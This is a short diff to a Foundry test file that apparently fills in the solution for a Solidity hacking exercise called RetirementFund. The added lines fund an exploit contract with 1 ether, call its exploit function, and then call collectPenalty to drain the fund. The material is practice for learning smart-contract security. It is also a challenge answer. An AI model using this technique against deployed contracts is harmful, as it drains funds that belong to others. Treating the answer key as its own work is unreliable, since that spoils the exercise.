@@ -20,6 +20,10 @@ contract RetirementFundTest is Test {
         // Use the instance retirementFund and exploitContract
 
         // Put your solution here
+        vm.deal(address(exploitContract), 1 ether);
+        exploitContract.exploit();
+
+        retirementFund.collectPenalty();
 
         _checkSolved();
     }
